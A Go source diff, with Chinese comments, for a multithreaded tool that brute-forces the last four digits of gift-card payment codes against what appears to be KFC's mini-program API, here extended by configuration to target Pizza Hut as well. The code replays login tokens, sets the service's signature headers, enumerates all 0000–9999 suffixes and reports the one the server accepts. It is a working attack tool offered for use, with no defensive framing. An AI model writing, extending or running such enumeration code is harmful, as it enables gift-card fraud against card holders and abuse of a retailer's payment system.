@@ -1,7 +1,7 @@
 package main
 
-// KFC 礼品卡 paymentCode 多线程枚举 (Go 版)
-// 读取 config.json 配置，枚举 paymentCode 后4位
+// 礼品卡 paymentCode 多线程枚举 (Go 版)
+// 支持 KFC / 必胜客，通过 config.json 配置
 
 import (
 	"crypto/md5"
@@ -24,7 +24,13 @@ type Config struct {
 	CardSequence  string `json:"cardSequence"`  // 卡号
 	PaymentPrefix string `json:"paymentPrefix"` // 密码前16位
 	Token         string `json:"token"`         // 登录凭证
-	OpenID        string `json:"openId"`        // 微信 openId
+	OpenID        string `json:"openId"`        // 微信 openId（必胜客可为空）
+
+	// 请求参数
+	SecretKey  string   `json:"secretKey"`  // 密钥标识: kfc=肯德基, ph=必胜客
+	EncodeList []string `json:"encodeList"` // 编码列表: KFC=["smsCode"], 必胜客=[]
+	Referer    string   `json:"referer"`    // Referer 头
+	Host       string   `json:"host"`       // Host 头
 
 	// kbsv 签名参数
 	ClientKey string `json:"clientKey"`
@@ -39,11 +45,12 @@ type Config struct {
 }
 
 // RequestBody 请求体（字段顺序决定 JSON 输出顺序）
+// OpenID 使用指针，nil 时省略该字段（必胜客无此字段）
 type RequestBody struct {
 	Token               string   `json:"token"`
 	CardSequence        string   `json:"cardSequence"`
 	PaymentCode         string   `json:"paymentCode"`
-	OpenID              string   `json:"openId"`
+	OpenID              *string  `json:"openId,omitempty"`
 	EncodeList          []string `json:"encodeList"`
 	IsFromCustomerClient bool    `json:"isFromCustomerClient"`
 	SecretKey           string   `json:"secretKey"`
@@ -80,10 +87,14 @@ func tryOne(suffix string) string {
 		Token:               cfg.Token,
 		CardSequence:        cfg.CardSequence,
 		PaymentCode:         paymentCode,
-		OpenID:              cfg.OpenID,
-		EncodeList:          []string{"smsCode"},
+		EncodeList:          cfg.EncodeList,
 		IsFromCustomerClient: true,
-		SecretKey:           "kfc",
+		SecretKey:           cfg.SecretKey,
+	}
+	// OpenID 非空时才加入（必胜客不需要）
+	if cfg.OpenID != "" {
+		oid := cfg.OpenID
+		body.OpenID = &oid
 	}
 
 	bodyBytes, _ := json.Marshal(body)
@@ -101,8 +112,12 @@ func tryOne(suffix string) string {
 	req.Header.Set("X-Yumc-Route-Cell", "yumc4")
 	req.Header.Set("X-Yumc-Route-Channel", "weapp")
 	req.Header.Set("User-Agent", "Mozilla/5.0")
-	req.Header.Set("Referer", "https://servicewechat.com/wx08ee7f7d36a2eff8/455/page-frame.html")
-	req.Header.Set("Host", "appcamp.kfc.com.cn")
+	if cfg.Referer != "" {
+		req.Header.Set("Referer", cfg.Referer)
+	}
+	if cfg.Host != "" {
+		req.Header.Set("Host", cfg.Host)
+	}
 	req.Header.Set("kbck", cfg.ClientKey)
 	req.Header.Set("kbcts", timestamp)
 	req.Header.Set("kbsv", kbsv)
@@ -237,13 +252,22 @@ func main() {
 		},
 	}
 
+	// 识别品牌
+	brand := "未知"
+	if cfg.SecretKey == "kfc" {
+		brand = "肯德基 KFC"
+	} else if cfg.SecretKey == "ph" {
+		brand = "必胜客 Pizza Hut"
+	}
+
 	// 打印信息
 	fmt.Println(strings.Repeat("=", 60))
-	fmt.Println("KFC 礼品卡 paymentCode 多线程枚举")
+	fmt.Printf("礼品卡 paymentCode 多线程枚举 [%s]\n", brand)
 	fmt.Println(strings.Repeat("=", 60))
 	fmt.Printf("卡号(cardSequence): %s\n", cfg.CardSequence)
 	fmt.Printf("密码前缀:           %s\n", cfg.PaymentPrefix)
 	fmt.Printf("枚举范围:           %s0000 ~ %s9999\n", cfg.PaymentPrefix, cfg.PaymentPrefix)
+	fmt.Printf("接口地址:           %s\n", cfg.FullURL)
 	fmt.Printf("线程数:             %d\n", cfg.Threads)
 	fmt.Printf("最大重试:           %d 次\n", cfg.MaxRetry)
 	fmt.Printf("成功条件:           errCode = 0")
